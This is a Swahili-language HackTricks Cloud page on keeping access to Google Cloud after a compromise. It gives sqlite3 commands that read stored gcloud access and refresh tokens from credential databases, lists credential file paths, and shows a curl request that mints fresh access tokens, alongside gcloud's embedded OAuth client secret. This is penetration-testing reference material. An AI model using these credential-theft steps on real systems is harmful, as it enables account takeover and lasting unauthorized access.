# GCP - Kudumu bila Huduma

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Hizi ni mbinu muhimu mara moja, kwa namna fulani, umefanikiwa kudukua baadhi ya siri za GCP au mashine inayotumika kwenye mazingira ya GCP.

## Udukuzi wa Kitufe

### Vitufe vya Mtumiaji Aliyethibitishwa

Ili kupata **kitufe cha sasa** cha mtumiaji unaweza kukimbia: 

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

Angalia ukurasa huu jinsi ya **kutumia kitambulisho hiki moja kwa moja kwa kutumia gcloud**:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

Ili kupata maelezo ya **kuzalisha kitambulisho cha upatikanaji kipya** endesha:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

Pia niwezekana kupata vitufe vya kuboresha katika **`$HOME/.config/gcloud/application_default_credentials.json`** na katika **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`**.

Ili kupata kitufe kipya cha ufikiaji kilichoboreshwa na **kitufe cha kuboresha**, kitambulisho cha mteja, na siri ya mteja endesha:
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

Uhalali wa vikwazo vya kuboresha unaweza kusimamiwa katika **Admin** > **Usalama** > **Kudhibiti kikao cha Google Cloud**, na kwa chaguo-msingi imewekwa kuwa saa 16 ingawa inaweza kuwekwa isiweze kumalizika:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### Mzunguko wa Uthibitisho

Mzunguko wa uthibitisho unapotumia kitu kama `gcloud auth login` utafungua dirisha la ombi kwenye kivinjari na baada ya kukubali skopes zote kivinjari kitatuma ombi kama hili kwenye bandari ya http iliyofunguliwa na zana:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Kisha, gcloud itatumia hali na nambari pamoja na `client_id` iliyoandikwa kwa nguvu (`32555940559.apps.googleusercontent.com`) na **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) kupata **data ya mwisho ya kibadilishaji cha kumbukumbu**.

{% hint style="danger" %}
Tafadhali elewa kuwa mawasiliano na localhost ni kwa HTTP, hivyo ni rahisi kuingilia data ili kupata kibadilishaji cha kumbukumbu, hata hivyo data hii ni halali mara moja tu, hivyo hii itakuwa haina maana, ni rahisi kusoma kibadilishaji cha kumbukumbu kutoka kwenye faili.
{% endhint %}

### Vipimo vya OAuth

Pata vipimo vyote vya OAuth kwa kutekeleza:

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

### Akaunti za Huduma

Kama ilivyo kwa watumiaji waliothibitishwa, ukifanikiwa **kuharibu faili ya ufunguo wa kibinafsi** wa akaunti ya huduma utaweza **kuiingia kawaida kwa muda mrefu kama unavyotaka**.\
Hata hivyo, ukiteka **tokeni ya OAuth** ya akaunti ya huduma hii inaweza kuwa ya kuvutia zaidi, kwa sababu, hata kama kwa chaguo-msingi tokeni hizi ni za manufaa kwa saa moja tu, ikiwa **mwendeshaji anafuta ufunguo wa api wa kibinafsi, tokeni ya OAuth itaendelea kuwa halali hadi itakapomalizika**.

### Metadata

Kwa wazi, muda mrefu ukiwa ndani ya mashine inayofanya kazi katika mazingira ya GCP utaweza **kupata akaunti ya huduma iliyowekwa kwenye mashine hiyo kwa kuwasiliana na mwisho wa metadata** (kumbuka kuwa tokeni za OAuth unazoweza kupata kwenye mwisho huu kawaida zinazuiliwa na scopes).

### Upatanisho

Baadhi ya upatanisho kwa njia hizi zinaelezewa katika [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## Marejeo

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
